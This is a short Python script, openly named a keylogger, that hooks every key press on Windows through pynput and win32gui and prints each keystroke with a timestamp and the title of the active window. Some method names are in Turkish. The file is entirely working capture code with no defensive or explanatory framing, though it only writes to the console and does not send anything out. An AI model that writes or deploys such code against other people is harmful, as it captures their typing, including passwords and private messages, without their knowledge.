import subprocess
from pynput import keyboard
from datetime import datetime as dt
import win32gui

class Keylogger:
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.on_press)

    def AktifPencereIsmiAl(self):
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        return window_title

    def on_press(self, key):
        now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            key_char = key.char
        except AttributeError:
            key_char = key.name

        aktifPencere = self.AktifPencereIsmiAl()

        print(f"{now} | {key_char} | {aktifPencere}")

    def start(self):
        self.listener.start()
        self.listener.join()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()